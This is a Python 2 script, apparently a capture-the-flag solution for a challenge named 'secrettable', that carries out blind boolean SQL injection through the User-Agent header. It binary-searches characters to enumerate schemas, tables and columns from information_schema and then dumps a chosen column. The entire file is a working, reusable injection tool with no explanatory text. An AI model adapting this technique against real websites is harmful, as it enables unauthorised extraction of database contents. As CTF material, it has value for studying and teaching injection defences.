import urllib2
from time import sleep

URI = 'http://secrettable.adctf2014.katsudon.org/'

def communicate(code):
    print code
    req = urllib2.Request(URI, None, {'User-agent':"'+(%s)+'" % code})
    try:
        res = urllib2.urlopen(req)
        http_code = 200
    except urllib2.HTTPError, e:
        http_code = e.code  
  
    return http_code==200

def decideValue(sql):
    lo, hi = 0x1f, 0x7f
    while lo < hi:
        mid = (lo + hi) / 2
        query = "case when (%s) > '%c' then 1 end" % (sql,mid)
        if communicate(query):
            lo = mid + 1
        else:
            hi = mid

    return hi

def SQLinjection(items):
    DATA=''
    for i in range(1,0x100):
        sql = "select substr(group_concat(%s),%d,1) from (select %s from %s %s %s) sub" % (items['column'],i,items['column'],items['table'],('where '+items['where'] if 'where' in items else ''),(items['others'] if 'others' in items else ''))
        if communicate("case when (%s) > '' then 1 end" % sql):
            DATA += chr(decideValue(sql))
        else:
            break
    return DATA.split(',')

def getSchema():
    items = {'column':"schema_name",'table':"information_schema.schemata"}
    return SQLinjection(items)

def getTables(TABLE_SCHEMA):
    items = {'column':"table_name",'table':"information_schema.tables",'where':"table_schema='%s'" % TABLE_SCHEMA}
    return SQLinjection(items)
    
def getColumns(TABLE_SCHEMA,TABLE_NAME):
    items = {'column':"column_name",'table':"information_schema.columns",'where':"table_schema='%s' and table_name='%s'" % (TABLE_SCHEMA,TABLE_NAME)}
    return SQLinjection(items)

def dump(TABLE_NAME,COLUMN_NAME,OTHERS):
    items = {'column':COLUMN_NAME,'table':TABLE_NAME,'others':OTHERS}
    return SQLinjection(items)


if __name__ == '__main__':
    All_Schema = getSchema()
    print 'Schema\t: '+str(All_Schema)
    schema=raw_input('>>')

    if schema in All_Schema:
        All_Tables = getTables(schema)
        print 'Tables\t: '+str(All_Tables)
        table=raw_input('>>')
    
        if table in All_Tables:
            All_Columns = getColumns(schema,table)
            print 'Columns\t: '+str(All_Columns)
            column=raw_input('>>')

            if column in All_Columns:
                print dump(schema+"."+table,column,"limit 1")

            else:
                print "Column '"+column+"' doesn't exist."
        else:
            print "Table '"+table+"' doesn't exist."
    else:
        print "Schema '"+schema+"' doesn't exist."
